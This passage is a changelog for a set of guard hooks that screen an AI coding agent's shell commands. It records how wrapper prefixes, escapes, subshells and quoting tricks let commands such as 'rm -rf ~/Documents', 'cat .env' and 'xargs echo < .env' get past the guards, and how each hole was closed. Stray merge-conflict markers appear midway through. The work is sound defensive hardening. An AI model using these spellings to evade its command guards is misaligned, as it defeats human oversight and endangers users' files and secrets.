  **The hunt is shared, so this was never trash-guard's alone, and for the other guards it was a hole on `main` too.** `(bash -c 'git reset --hard HEAD~3')` reached no `git-safety`; `{ sh -c 'gh pr merge …'; }` reached no `guard-gh-write`; `for f in a; do sh -c 'op item list'; done` reached no `guard-op-vault-scan`; `(bash -c 'cat .env')` reached no `prevent-secret-leaks`; and `if true; then nice -n 10 bash -c 'rm -rf ~/Documents'; fi` reached no `guard-rm` — which survived `( )` on its own group strip but not `if`/`then`. All five block now.

  **One pre-processing model, in one function.** `core::shell::executable_tokens` reduces a segment to the tokens of the command that will run, and both positions call it. Neither half is sufficient alone and the order is not enough either: the string-level `strip_group_wrappers` is the only thing that can reach punctuation `tokenize` glues to a word (`(bash` is one token, and the closing `)` rides on the last one, so a token-level strip returns a script carrying a stray paren), while the new `strip_compound_heads` is the only thing that can reach a reserved word, a `case` arm's pattern label, or a function definition header. Run once each in either order they still miss the composition — `do (bash -c 'rm note.md')` keeps a glued `(` once `do` is gone — so `executable_tokens` alternates them to a fixpoint. `case` and function headers are new to the verb gate as well, since it now reads the same function; the two positions cannot drift again without changing one call.

  **Widening a shared primitive, measured rather than argued.** Every consumer of `command_segments` / `child_scripts` / `shell_c_argument_tokens` was enumerated (`trash-guard`, `guard-rm`, `prevent-secret-leaks`, `prevent-secret-writes`, `git-safety`, `redact-external-content`, `guard-gh-dangerous`, `guard-gh-write`, `guard-op-vault-scan`, `warn-untracked`, `warn-pr-issue-link`, `warn-gh-merge-preflight`, `warn-going-public`, `inject-gh-write-context`, `enforce-worktree`) and driven differentially against an `origin/main` binary: 15 guards × 112 commands = 1,680 cells, **13 verdicts strengthened, 0 weakened by this change**, 0 non-0/2 exits. The inverted risk — a consumer using segments to satisfy an *exemption*, where more segments could subtract a block — was checked at `prevent_secret_leaks`' `.envrc` carve-out and `prevent_secret_writes`' exemptions and holds: both aggregate by OR, and `command_has_cd` is computed from the raw command string, so segmentation cannot change its input. A primitive-level differential over 156 commands confirms **0 segments and 0 substitution bodies lost**, 57 added — the `#528` substitution union is intact. The 6 rows still weaker than `main` all predate this change and are the deliberate narrowing (`npm run format`, `terraform destroy`, `git commit -m 'rm the old notes'`, and a delete verb quoted as prose).

  **What the strip refuses, so widening a detector does not eat a command word.** A `case` label must be a single `)`-terminated token where the grammar puts one — after `in`, or at the segment head — because scanning forward for any `)`-terminated token takes the script out of `bash -c 'echo hi)'`. The bare head form additionally refuses a label carrying `(`, `$` or a backtick, and refuses one followed by a redirect or a flag: `(cd /x; ls) > out` segments as `ls) > out`, where the `)` closed a subshell and `ls` is the verb, not a pattern. A function header must have a name that starts with a letter or `_`, so `-c()` is a flag rather than a definition. Compound bodies the model still does not treat as executed — a `trap` handler, a `coproc` — stay open and are named as a class in the boundary above.

- **`split_segments` honors backslash escapes, so a segment boundary means what the shell means by it (cameronsjo/cadence-hooks#475).** The splitter cut at every newline with no continuation awareness and toggled quote state on every `"` regardless of a preceding backslash — while `tokenize`, the parser that reads the resulting segment's words, does both correctly. Two parsers disagreeing about where a word ends is a boundary the shell does not have, and any guard that reasons per segment inherits it.

  **A backslash-newline is a line continuation, not a boundary.** Cutting there put a command's verb in one segment and its own flags in the next, so a per-segment gate failed on the segment holding the payload and that command went unexamined end to end. This is the ordinary shape of a hand-written multi-line invocation — `gh issue create --repo o/r \` / `--title "…" \` / `--body-file body.md` — and every variant of it was affected: `\`-continued `--body`, the `--body "$(cat <<'EOF' … EOF)"` form, and the CRLF spelling. Both characters are now consumed and the command flows on, matching the shell. `\r\n` is handled; a lone `\<CR>` stays an ordinary escape.

  **Continuation joining and heredoc stripping are interleaved, one logical line at a time, because each is wrong without the other.** A heredoc body begins on the line after the *logical* line that introduces it, so stripping first measures the body from the wrong line — and leaves the introducer's trailing backslash dangling in front of whatever followed the terminator, which the join then absorbs: `cat <<'EOF' \` / `body` / `EOF` / `rm -rf /tmp/x` collapsed into one segment and the `rm` stopped being in command position for any of them. But joining as a pre-pass over the whole command is wrong too, and worse. A heredoc body is *data* — exempt from shell quoting — so a quote-tracking pre-pass desynchronized on the first apostrophe in ordinary prose ("it's") and suppressed every later continuation, cutting a `gh issue create … \` / `--body-file …` in half and skipping the scan entirely. Assembling one logical line and reading each body raw satisfies both.

  Quoting is deliberately not tracked while joining, and the trade is documented where it lives. Bash keeps a backslash-newline literal inside `'…'` and this does not, but the divergence cannot move a segment boundary — the characters removed are a backslash and a newline, neither is a quote character, and a newline inside quotes was never a boundary. Being faithful there is what required the quote tracker that desynchronized, so a cosmetic fidelity point was traded away to close a guard miss. Tests assert the segment *count* rather than pinning the joined text as if it were correct.

- **An expanding heredoc's substitution carry-forward no longer loses the substitution to an apostrophe in the prose beside it (cameronsjo/cadence-hooks#475).** An unquoted-delimiter heredoc expands command substitutions, so body lines containing `$(…)` are re-appended to the introducing line specifically to keep that read visible. The whole line was carried, prose included — and everything downstream reads a segment as shell syntax, so a contraction in the body opened a quote state that suppressed the very substitution the mechanism exists to surface: `echo <<EOF` / `it's here $(cat .env)` / `EOF` stopped yielding `cat .env` as a segment. Only the substitution spans are carried now, extracted quote-blind because inside a heredoc body there is no quoting. Pre-existing rather than introduced here, but the same root as the fixes above — prose is data, and shell-quoting semantics must never be applied to it — so it is fixed alongside them. The regression test asserts the read surfaces as its OWN segment: the carrier segment contains the text either way, so a substring check passes even when the recursion never ran.

  **An escaped quote is a literal character, not a string terminator.** `git commit -m "he said \" && rest"` is ONE argument to bash, but the splitter read the `\"` as closing the value and turned the `&&` inside it into an operator — laundering the rest of the argument into a fake second segment that no longer looked like the command it belongs to. Same for `;` and `|`. Quote tracking now reads `\"` and `\\` inside `"…"` as content, exactly as `tokenize` does; `'…'` still takes no escapes, and outside quotes a `\"` opens no string. The escape is consumed as a pair, so `\\` before a newline still separates — pinned by control.

- **`split_segments` understands ANSI-C `$'…'` quoting, closing the last place it disagreed with `tokenize` (cameronsjo/cadence-hooks#475).** `$'…'` honors `\'`, and reading it as a plain `'…'` closed the string on the escaped quote — after which the real closing `'` reopened a phantom string that swallowed the rest of the line. `git commit -m $'msg with \' quote' && rm -rf /tmp/x` collapsed into ONE segment with the deletion absent from the segment list entirely: not misfiled, not truncated, simply invisible to every guard that reasons per segment. Confirmed against bash, which passes the value as a single argument and runs the second command normally.

  This is the divergence #463 hardened `tokenize` against, in a different costume one layer up. The three quoting modes now live in one shared `Quote` type used by both the tokenizer and the segmenter, so they cannot drift apart on where a quoted run ends — a structural guarantee rather than two parsers that happen to agree today. Pinned by the escaped-quote case, by a test asserting the two parsers agree on the same input, and by two controls: plain `'…'` still takes no escapes (the first `'` closes, so a following `&&` is a real operator), and a `$` before anything other than `'` is still ordinary text.

- **`command_segments` applies a visible assignment only to the segments that follow it (cameronsjo/cadence-hooks#475).** Assignments were collected line-wide with no ordering awareness, so a *later* one resolved an *earlier* `$VAR`. `cmd --file $F || F=/some/path` substituted the path into a command the shell would have run with `$F` unset — inventing an operand, and inviting any guard that inspects file operands to open a file the real command never names. Assignments now accumulate as segments are walked: an assignment reaches later segments only, never earlier ones and never its own words (`F=new cmd $F` passes the OLD `$F`, as bash does). A re-assignment resolves to its newest value, and a subshell's assignments — inside `sh -c` or a substitution — no longer leak back to the parent's later segments.

- **`redact-external-content` scopes body extraction to the posting segment, so a compound line no longer scoops its siblings (cameronsjo/cadence-hooks#424).** The external-post gate ran over the whole command line and so did extraction, which meant one posting segment authorized reading flag values from every *other* segment on the line. `gh secret set NAME --body '…' && gh pr comment -b hi` nudged on the **secret's** body — text that never posts anywhere — and `gh api x --body-file f && git commit -m hi` **read the file** `gh api` named, a disk read triggered entirely by a non-posting segment. Standalone commands were never affected: the whole-line gate already refused them, which is why the issue's original premise (that `gh secret set` alone leaked) did not reproduce.

  The gate now runs per segment via `command_segments`, and only a segment that passes it has its flag values read. Ordering is the substance of the fix rather than a detail of it: a file named by a non-posting segment must never be *opened*, so the gate has to precede extraction — filtering extracted bodies afterwards would still have performed the read.

  Segmentation is safe for the one body form that looks like it would break. A heredoc carried in a quoted command substitution — `git commit -m "$(cat <<'EOF' … EOF)"` — sits inside quotes, so segment splitting never treats it as a top-level heredoc body and the text rides into the `-m` value intact; the module's previous "deliberately NOT segment-based" note reasoned from `split_segments`' heredoc stripping, which this form never reaches. Wrapper segments cannot double-extract either, because the gate quote-strips first: `sh -c "gh pr create --body '…'"` reduces to `sh -c` and fails the gate, leaving the expanded inner segment as the sole extractor.

  A side effect of dropping the whole-line gate is that expansion-only posts are now caught rather than missed — `CMD=gh; $CMD pr comment -b '…'` resolves through `command_segments`' assignment handling, where the raw line never matched. The widening moves toward *more* scanning of things that genuinely post, never toward reading a body that does not.

  Pinned by both proof-of-concepts as regressions, each paired with a discriminating control: the file-read test uses a fixture loaded with a hit, and a sibling test proves that same fixture shape *does* nudge when the segment posts — so the Allow is evidence of no read, not of a scan that could never have fired. A mixed line where both segments post asserts a hit from each.
||||||| 3b22ffb
||||||| c451282
||||||| 890848f
- **A wrapper prefix no longer hides a `sh -c`/`bash -c` script from `command_segments`' expansion.** `bash -c 'cat .env'` was blocked by `prevent-secret-leaks`; `sudo bash -c 'cat .env'` and `command sh -c 'cat .env'` were allowed. Two mechanisms had to line up and the prefix broke the first: the expansion recognized only an *unprefixed* wrapper, so no expansion happened, and the script body then survived as a single **whitespace-bearing** token — which `segment_env_reads`' false-positive firewall skips by design, since that rule is what keeps quoted prose from matching. The read inside the script therefore reached no guard at all.

  The asymmetry was between two entry points into the same detection. `child_scripts` handed in an argv its caller had already stripped of transparent prefixes, while `expand_segments` called `shell_c_argument`, which tokenizes the **raw** segment. One path saw a prefixed wrapper and the other did not, and the doc comment described only the first. Prefixes are now skipped inside the shared function, so the two agree by construction; the skip is idempotent, so the already-stripping caller loses nothing. The command word also goes through `command_word` rather than a local basename, which keeps `/bin/sh -c` working and makes `\bash -c` work.

  **The prefix set here is wider than `core::shell::TRANSPARENT`, and the reason is the direction of the check.** This one feeds a *detector* — find the wrapper in order to expand it — where a missed skip costs the inner script's visibility to every guard that segments, while an extra skip only adds a segment to inspect. `TRANSPARENT` is consumed by `enforce-worktree` and `guard-rm` to decide *which verb runs*, where a wrong skip resolves the wrong command word, which is why it excludes `sudo` deliberately and must keep excluding it. Same question, opposite consequence — the same detector-versus-exemption distinction #469's review surfaced, in its other direction.

  That direction is not a licence to skip anything prefix-shaped: `command_segments` feeds block-capable guards, so expanding a script the shell would not run could manufacture a false block. The set stays a short list of words that genuinely exec their argument, and `sudo`'s own options are not parsed — `sudo -u root bash -c '…'` stays unexpanded rather than risking a wrong resolution, the same refusal `skip_transparent_prefixes` makes.
- **`prevent-secret-leaks` now resolves a segment's head to the verb the shell will run, so a comment marker or a wrapper prefix no longer costs a command its metadata-only exemption (cameronsjo/cadence-hooks#469).** The guard decides whether a `.env`-shaped operand is a *read* by looking up the segment's first token in an allowlist, and that token reached the lookup verbatim. Basename splitting and quote stripping already happened, so `find`, `/usr/bin/find`, and `'find'` passed — but `command find`, `\find`, `sudo find`, `env find`, `time find`, and `nohup find` all blocked, as did `command ls -la .env`, `\ls -la .env`, `sudo stat .env`, and `command wc -l .env`. Those last four are exemptions the block message itself advertises, which is what identifies this as head resolution rather than a missing allowlist entry. A `#`-led line hit the same lookup from the other end: a comment mentioning a secret file tokenized as the command `#` with the filename as its operand, and the diagnostic said so literally — ``Found: `.env` as an operand of `#` `` — so a command was blocked over a line bash never executes.

  **This was a false-positive class, not a leak**, and the direction matters for how much the fix is allowed to widen. An unrecognized head does not fail open here: the check is verb-agnostic, so anything not on the metadata-safe allowlist falls through to the dangerous-operand scan and blocks. Every spelling above therefore erred toward blocking, and the cost was paid in trust rather than in secrets. It is still worth fixing precisely, because on a machine that aliases `find`→`fd` and `cat`→`bat` the documented way to get the real program is `command find` or `\cat` — so the guard blocked the spelling the operator's own rules mandate and permitted the bare one that silently runs something else.

  Head resolution is now three steps. A `#`-led head is a comment and the segment contributes no operands at all. Wrapper prefixes are peeled. The survivor goes through `core::shell::command_word` — basename, exactly one leading backslash, a `.exe` suffix — rather than another local `rsplit('/')`, which is the consolidation #450 landed that primitive for. The single-backslash rule is load-bearing in both directions: `\ls` **is** `ls`, while `\\ls` is a different word the shell resolves to `\ls` and fails to find, so it must not collapse.

  **The wrapper set is deliberately local, and two words are deliberately not in it.** `core::shell::TRANSPARENT` says in its own doc comment that unifying the repo's prefix sets "would widen two gates that can block"; this is the third such gate, so it keeps its own copy — `sudo`, `command`, `nohup`, `time`. `env` is excluded because its verdict depends on its operands (bare `env` *dumps* the environment), so it is resolved through this file's existing `peel_env_options`, the grammar #411 already spelled out, rather than a second copy that could let the read arm see an exec where the dump arm sees a dump. A wrapper's own flags are not parsed: `sudo -u root ls .env` lands on `-u`, which no allowlist contains, so it keeps blocking — the same verdict as refusing to peel, reached without teaching this guard four flag grammars.

  **`xargs` is excluded because peeling it was a measured credential leak**, caught in security review before this shipped. The first draft copied `prevent-secret-writes::COMMAND_WRAPPERS` verbatim, `xargs` included, on the reasoning that the sibling blocking check was the in-tree precedent. `xargs echo < .env` then printed real credentials while the guard exited 0. The control is what makes it precise: bare `echo < .env` prints an *empty line*, because `echo` ignores stdin — which is exactly why `echo` was safe to put on the metadata-safe list. Peeling `xargs` handed an exemption earned by a verb that cannot read to a pipeline that does, and the whole exemption family was reachable the same way (`xargs printf`, `xargs wc`, `xargs ls`, `xargs stat`, `xargs git log`, several leaking via stderr), through every spelling — `\xargs`, `/usr/bin/xargs`, `sudo xargs` — against `.env`, `~/.aws/credentials`, and `id_rsa` alike. Pre-#469 all of these blocked, since the head was the literal `xargs`.

  **The precedent inverted, and that is the generalizable lesson.** In `prevent-secret-writes` the peel is used to *find* a writer verb, so peeling there can only ever ADD blocks — a deeper look finds more danger. Here the peel feeds an *exemption* lookup, so it can only ever SUBTRACT them. Identical code shape, opposite safety direction, and nothing in either file's local text said so. `core::shell::TRANSPARENT` had already reached the narrow reading independently — it names `xargs` explicitly as a prefix *outside* the transparent set — and that disagreement was the available signal. The rule now recorded on the constant: **before copying a normalization, ask whether the copy feeds a detector or an exemption.** A detector can be over-eager safely; an exemption cannot.

  The same one-token removal closed `find . -name .env -exec xargs echo {} \;`, which the shared peel had also opened. No contents-emitting proof was built for that spelling, so it counts as a lost block rather than a demonstrated leak.

  **The operand scan starts at `argv[0]`, not `argv[1..]`.** After a peel the dangerous token can *be* the resolved head — `sudo .env` leaves `argv = [".env"]` — and a scan starting at index 1 examined nothing, turning a pre-#469 BLOCK into an ALLOW. Every spelling anyone constructed for that shape executes `.env` rather than printing it, so the impact is hardening rather than a demonstrated leak; it is fixed anyway, because the argument for harmlessness rests on "no spelling we could construct" — an absence-of-evidence claim about a space nobody enumerated — and BLOCK→ALLOW is the wrong direction to accept one in. Including index 0 costs nothing, since a genuine command word never classifies as a dangerous secret token.

  One consequence is worth naming because it looks like a loosening: `sudo rm .env` now passes *this* guard. `rm` has been on the metadata-safe list all along, with a comment explaining why — `prevent-secret-writes` blocks it with the right rationale, and a double block here would attach the wrong message. Peeling `sudo` simply lets the wrapped spelling reach the same handoff the bare one already did; `prevent-secret-writes` was probed on both spellings and blocks them.

- **`enforce-worktree` now recognizes a path-qualified or alias-escaped `git` as the commit it is (cameronsjo/cadence-hooks#450).** The commit gate compared the segment's leading word to the literal string `git`, so `/usr/bin/git commit` and `\git commit` yielded no commit target at all — and no target means no block. Measured from a primary checkout on a feature branch with every kill switch cleared and a known-BLOCK control leading the batch, both ran a real commit and resolved to ALLOW. Neither is exotic: invoking git by absolute path is ordinary in a script, and `\git` is the standard way past a shell alias. The transparent-prefix spellings (`command git commit`, `env git commit`) already blocked, which is what made the gap specific — the guard modeled the prefixes but not the verb's own spelling.

  **The gap was wider than the issue, in two directions the fix now covers.** The Windows spellings were missed too — `basename` splits on `/` only and never dropped a `.exe` suffix, so `C:\Program Files\Git\cmd\git.exe commit` and `…/git.exe commit` fell through to the same silent ALLOW, in a guard that already treats Windows paths as a live fail-open class (#377/#378). And the gate's *siblings* had the identical hole: `is_package_mutation` and `file_mutation_targets` matched on a bare `basename`, so `\npm install`, `\cargo add`, and `\sed -i <file>` produced no mutation target at all. Closing only the commit gate would have left #450's own shape live one function over.

  So the normalization is now one shared primitive, `core::shell::command_word` — path segment, then **exactly one** leading backslash removed, then a case-insensitive `.exe` dropped. Four divergent copies existed before, disagreeing on both the order of those steps and whether the backslash strip repeated, and the differences decide real verdicts: strip-then-split misses `/opt/\git` (which the shell runs as `/opt/git`), and a repeating strip collapses `\\git` to `git` when the shell removes one backslash and looks up `\git`, a different command — the bug caught during #442's review. The commit gate, both mutation gates, and `guard-gh-write`'s `gh` token test all route through it now. Two of those are block-capable — the commit gate and the `gh` write gate — where a missed spelling was a silent bypass; the two mutation gates feed an advisory nudge, so there the cost was a lost warning rather than a lost block. In `guard-gh-write` the measured change is `/opt/\gh issue create -R <not-yours>`, which previously found no `gh` token, fell back to the cwd remote, and allowed. A `gh.exe` write there still allows, for a *different* reason recorded and pinned in place: that guard decides "is this a write?" with a raw-text regex (`gh\s+<noun>\s+<verb>`) that `gh.exe issue create` does not match, and rebasing it onto a reconstructed argv is its own change to a block-capable guard rather than something to ride in here.

  Two call sites deliberately do **not** converge, both because the direction inverts. `is_dismiss_enforce_segment` recognizes a *bypass*, where a missed spelling merely refuses a dismissal (failing toward blocking) and a widened one widens the escape hatch. `guard-rm`'s local `command_word` keeps its repeating backslash strip: converging would make `\\rm` stop reading as a deletion, which is what the shell does but is also a *loosening* of a block-capable guard on a spelling nobody has measured — not something to ride in on an unrelated PR. Both carry the reasoning inline.

  **Unlike #428's withdrawn `guard-rm` widening, the narrowness protected no verdict.** There, declining to model `\cd` was what *kept* the real directory under judgment; here, failing to recognize the verb produced a silent ALLOW. Pinned by the issue's six-spelling table, the Windows spellings, the escaped mutation verbs, and negative controls for `\\git`, for names that merely end in `git` (`legit`, `gitk`, `/opt/git/bin/hub`), and for a backslash that is not a separator (`a\b\git`). One accepted miss is recorded rather than papered over: a backslash-escaped space (`/c/Program\ Files/…`) splits into two tokens before the classifier runs, so the quoted spelling is the one that resolves.

- **`GitState` and `is_primary_checkout` no longer disagree about a `--separate-git-dir` primary (cameronsjo/cadence-hooks#345).** PR #343 fixed `is_primary_checkout` to classify by resolved git identity — primary iff the canonical git-dir equals the canonical git-common-dir — but `gitstate.rs`'s `worktree_git_dir` still classified by the `.git` surface form (dir → primary, file → linked). A `git init --separate-git-dir` primary has a `.git` *file*, so one checkout read as Primary on the `enforce-worktree` path and Linked through `GitState`. `warn-subagent-worktree` consumes `GitState::is_primary()` for its policy decision, so it silently skipped its nudge on exactly those checkouts.

  Both now route through one `git_dir_is_common_dir` comparison, so the two helpers cannot drift apart again. The `.git`-is-a-directory fast path is unchanged, resolution failure still means "not primary" (fail-open per ADR-0001, in the correct direction for both a block and a nudge), and a real linked worktree is pinned as a control so sharing the classifier does not simply call every `.git` file primary.

  **Expect one new nudge:** any checkout whose `.git` is a file pointing at its own common dir now reads as primary, which includes submodule working trees as well as `--separate-git-dir` checkouts. Dispatching a subagent from one, with a sibling worktree present, will warn where it previously stayed silent. That is the two helpers converging on the answer `enforce-worktree` already gave, not a new policy.

- **`prevent-secret-leaks` no longer flags `env … <command>` as an environment dump (cameronsjo/cadence-hooks#411).** `env_dump_commands` listed `env`, and the check fired on a segment-leading `env` regardless of operands — so `env FOO=1 make` warned, and so did `env -u CADENCE_ALLOW_MAIN -u CADENCE_NO_ENFORCE_WORKTREE bash probe.sh`, the form this repository's own `CLAUDE.md` *prescribes* for trustworthy guard verification. `env` with no operands prints the environment; `env … cmd` execs and prints nothing, and the remediation the nudge offered ("run programs that use env vars directly") described what the command already did. The cost was never the interruption: the cheapest way to silence a nudge attached to the correct practice is to drop the `env -u`, which silently restores the ambient-`CADENCE_ALLOW_MAIN` false-pass that prefix exists to prevent.

  `env`'s own options and `VAR=value` assignments are now peeled and **the dump test re-run on whatever verb remains** — the half a naive "an operand follows, so it is an exec" test would get wrong in both directions: `env -u FOO printenv` still warns because the surviving verb is itself a dump, `env env` still warns, while `env -u FOO make` goes quiet. `-u`/`--unset`, `-C`/`--chdir` and `-P`/`--default-path` consume a value, `--` ends option parsing, clustered and attached short forms (`-iu FOO`, `-uFOO`) are handled, and `-S`/`--split-string` is treated as an exec outright because its value *is* the command line. Short options are matched case-insensitively because the caller hands the check a fully lowercased command — testing only the uppercase spelling left `-C`/`-P`/`-S` unconsumed, so `env -C /tmp printenv` read `/tmp` as its verb and lost a warning the old leading-word test did catch. `core::shell::skip_transparent_prefixes` could not serve — it deliberately refuses to skip a prefix whose next token starts with `-`, which is exactly this shape — so the grammar is spelled out locally rather than widening a helper two block-capable guards share.

  Redirections are **skipped**, not treated as the end of the command. bash permits them anywhere in a simple command, so truncating at the first `>` left options only and re-fired the very false nudge being fixed — `env -i >out.sh bash script.sh` and `env -u FOO 2>/dev/null make` are ordinary execs. Skipping the operator (and its target, when detached) still keeps `env > out.sh` a dump, which the previous leading-word check got right by accident: that is a dump whose output is being *captured*, the more alarming shape, not less.

  Two misses are recorded rather than papered over. `env -S 'printenv'` hides a dump inside the split-string value, which this check's whitespace tokenizer cannot re-enter faithfully. And `env 2>&1 make` still warns — not through anything this check decides, but because `split_segments` reads the `&` of `2>&1` as a control operator and hands over `env 2>`; that is pre-existing, shared with every guard built on that splitter, and pinned by a test so a future fix to it surfaces here.
- **Transcript reads are bounded to the tail, and the `-F` message cap holds during the read (cameronsjo/cadence-hooks#361).** Two hardening follow-ups from PR #360's security review. `warn-commit-provenance` loaded the whole session transcript with `read_to_string` on every `git commit` to resolve two fields off its *last* line — a long session's multi-hundred-MB file, read in full, for a tail scan. The new `core::transcript::read_tail` seeks to the final 1 MiB and returns whole lines; `warn-commit-provenance`, `platform-drift`, and `guard-read-model` all route through it, as does `persist-plan` (already capped at 32 MiB, but reading from the front and resolving *nothing* past the cap — the tail read resolves at any file size).

  **The bound does not trust `st_size`.** The length comes from an `fstat` on the already-open handle, and the read is capped with `take` regardless, so a file reporting a size of 0 while holding gigabytes is read from the front and still bounded rather than seeked. A tail window can open mid-codepoint, so everything through the window's first `\n` is dropped — `\n` cannot occur inside a multi-byte UTF-8 sequence, which makes the remainder a codepoint boundary by construction, and the discarded fragment is one line further from the tail than anything the resolvers read.

  Second half: `read_message_file`'s 64 KiB cap on a `git commit -F` file was checked against `metadata().len()` and then read with a plain `read_to_string` — correct on APFS, but a `/proc`-style file on Linux reports 0, passes the check, and is read unbounded. The size gate is now the read itself: `take(cap + 1)`, rejecting a buffer that fills it, so an honest oversized file and a liar are rejected identically for at most one extra byte read. `core::paths::read_untrusted_config` carried the same `st_size`-then-`take` shape, so both now delegate to one `core::paths::read_capped(path, max_bytes)` — which keeps the non-regular check on the pre-open `stat`, where it must be (a FIFO blocks on `open`, so rejecting it afterwards is too late).

  No behavior change is intended beyond bounded resource use — both are warn-tier, fail-open paths. Per-caller resolution is pinned on a transcript larger than the bound, and the cap boundary is pinned from both sides (a file of exactly the cap reads; one byte over is rejected).

- **`guard-rm`'s flagged-prefix gate now arms on the two deletions that name no delete verb (cameronsjo/cadence-hooks#443).** A transparent prefix carrying its own option (`env -i`, `nice -n 10`) stops `skip_transparent_prefixes`, so `argv` still leads with the prefix and the delete verb behind it is never seen in command position — #426 closed that by re-arming the gate whenever *any* token's basename was a delete verb. Two spellings name one nowhere in the stream. `find … -delete` never mentions a delete verb at all, and a `sh -c '…'` wrapper carries its whole script inside ONE token whose basename is the script's last path segment (`rm -rf /srv/repo` → `repo`). Both collected nothing, and an empty target list reads as "not a deletion" — a silent ALLOW on `env -i find ~/Documents -delete` and on `nice -n 10 bash -c 'rm -rf ~/Documents'`.

  The token scan becomes `mentions_deletion`, which unions the delete-verb test with `destructive_find` (gated on a `find` command word, then delegating to the same `find_is_destructive` the in-command-position branch uses) and `wrapper_script_deletes` (locating a wrapper anywhere in the stream, not just at token 0, and re-tokenizing its `-c` script — extraction reused from `child_scripts` so the `-c` grammar, glued `-ec` forms included, stays in one place). Wrapper recursion rides the shared `MAX_WRAPPER_DEPTH` budget, so a nested `sh -c 'sh -c "…"'` terminates.

  The scan is bounded at 2048 tokens. `wrapper_script_deletes` is quadratic in token count (it copies the tail at each wrapper candidate) and measured ~1s at 8000 tokens; past the cap it reports a deletion *unscanned*, so the gate emits an `Unresolvable` and the command ASKs. Failing toward the prompt is this guard's default posture — a command that large is not "structurally proven safe" — so the cap costs at most one prompt on a pathological input and cannot open a hole. It is a latency bound, not a security one: these are self-authored commands, so the concern is a stalled hook rather than an attacker.

  The two sides of the wrapper test are reconciled on the way in: membership goes through `command_word`, which strips the alias-bypass `\`, while `child_scripts` recognizes the shell word with a bare `rsplit('/')`. Left as they were, `env -i \sh -c 'rm -rf ~/Documents'` passed the membership test and then extracted nothing — still a silent ALLOW, one spelling short of the fix. The normalized word is handed over so both sides agree.

  **The widening moves in one direction only: silent-ALLOW becomes ASK, never a BLOCK becoming anything softer.** Reaching the gate means `argv` still leads with the prefix, so the delete/`xargs`/`find` branches below it all miss and the segment's own collection is empty by construction; the added `Unresolvable` therefore replaces nothing. `child_scripts` recursion runs *before* the gate and has already pushed its targets, and `Outcome::merge` keeps the most severe verdict, so a BLOCK found inside an already-recursed child script still wins. Pinned by a twenty-one-spelling regression test asserting every previously-blocking form still blocks, and by a negative control (a wrapper or `find` that deletes nothing) so a flagged prefix does not start prompting across the session.

- **`guard-rm` no longer blocks a symlink for the repo it merely points at (cameronsjo/cadence-hooks#402).** `rm`/`unlink` on a symlink removes the LINK — the repo on the other side is unreachable by that operation. The git-root probe stats `<target>/.git`, and that `stat` **follows the link**, so a symlink to a checkout reported `GitRepo` and blocked on a repo the command could never touch. A new injected `is_symlink` probe settles it with an `lstat` (`symlink_metadata`, which does not follow the final component — `metadata` would agree with the git-root probe and answer the wrong question), and a `GitRepo` operand that is itself a link demotes to the scratch class.

  **A trailing slash is the exception, and it is load-bearing.** Pathname resolution dereferences `link/`, and BSD fts descends through it (`find link/` lists the target's contents), so `rm -rf link/` really can reach the repo and keeps its BLOCK verdict — pinned by test, as is the unchanged verdict for a real repo directory and for a symlink probe firing on some other path.

  **The demotion applies only when the operand names the link ITSELF, and three guards enforce that** — each closing a route where the shell really does resolve through the link:

  - **A glob operand.** `rm -rf link/*`, `rm -rf link/.*`, and `rm -rf link/?` are expanded by pathname resolution *before* `rm` runs, so they name the repo's contents. None of them is a *file-scoped* glob (`is_file_scoped_glob` excludes a last segment that is bare `*`/`?` or starts with `.`), so they never take the `FileGlob` branch — they reduce to the link's own path as plain operands and would have landed squarely in the demotion arm.
  - **A bare cwd sweep.** `cd link && rm -rf *` and `cd link && rm -rf .` carry no path in the operand at all; the resolved target is the effective directory, which is the link. Same hole, reached by standing inside it.
  - **A `find` that follows symlinks.** `-L` follows every symlink it meets and `-H` follows the ones in its arguments — and a search root *is* an argument — so `find -H <link> -delete` walks the real tree behind the link. `find_roots` skips both as global booleans, leaving a plainly-spelled root that reaches the demotion with nothing in the operand string to betray it, so the fact is passed down from the `find` branch instead. `-P` and the default do not follow, and still judge the link itself.
  - **A literal `.git` component.** `PathClass::GitRoot` is `has_git_component(norm) || is_git_root(norm)`, and only the second is the probe this fix reasons about. A symlinked `.git` — the real `repo/.git -> /store/repo.git` bare-repo layout — classifies from the string with no probe involved, so demoting it would have rested on a rationale that never applied.

  The first three ride a `dereferences` flag computed in `resolve_target`, because by the time the judge sees a resolved path the spellings are indistinguishable — all of them reduce to `link`. The `find` case adds a `caller_dereferences` argument for the same reason in reverse: only the caller knows a flag makes the walk follow a root the operand string shows as ordinary. The guards are ordered cheapest-first, so two field tests and a string scan run before the `lstat`, the only syscall in the chain.

  The trailing-separator test reads the **raw** path and accepts both `/` and `\`. `normalize` would fold the separators but also strip the trailing one — the very signal being tested — and Windows is a shipped target, so a `/`-only check let `rm -rf C:\repo\link\` allow where its forward-slash twin blocked.

  The demotion also stays `GitRepo`-only: a symlink that is a home child or sits inside the vault is classified by those rules first and never reaches the arm. Each guard was verified load-bearing by neutralizing it and confirming the matching test goes red, rather than by reading a green suite as proof.
- **`guard-gh-write` judges the parsed argv of a command, not the characters in it** (cameronsjo/cadence-hooks#463, #353). Every arm that decided *where a write would land* — the three target-resolution arms of `resolve_target_repo`, the user-scoped exemption, and the `gh api` unverifiable gate — matched a regex against the whole raw segment, so the verdict came from text the shell would never execute as a command. Eleven escapes, all silent ALLOWs, all closed by routing every arm through one quote-aware parse (`gh_argv`) over a tokenizer that agrees with the shell — and, where the command text genuinely cannot settle the target, by refusing to guess:

  **Prose in a `--body` donated a target.** `gh issue comment 42 --body "moved to repos/cameronsjo/allowed"` matched arm 3's `API_REPOS` over the entire segment, resolved to an allowed repo, passed the allowlist, and returned *before* the git-remote arm ever ran — so gh then wrote to a cwd remote the guard never checked. Arm 1 shared the shape via `split_whitespace`, which read a bare `-R owner/repo` inside a quoted body as the flag itself; arm 2's `REPO_SUBCOMMAND` matched `gh repo archive owner/repo` anywhere in the segment, including inside quotes. No adversary is required for any of these — quoting a repo path in a comment body is enough, which defeats exactly the silent-wrong-target case the guard exists for.

  **The user-scoped exemption was the worst of the four**, because it did not merely resolve the wrong target — it skipped resolution entirely. `gh gist` and `gh repo fork` create under your own account, so both are exempted by an unconditional `continue`. That exemption keyed on the substrings `gh\s+gist\s` and `gh\s+repo\s+fork\b`, so `gh pr create --title t --body "see gh gist for logs"` was waved through with no ownership check at all.

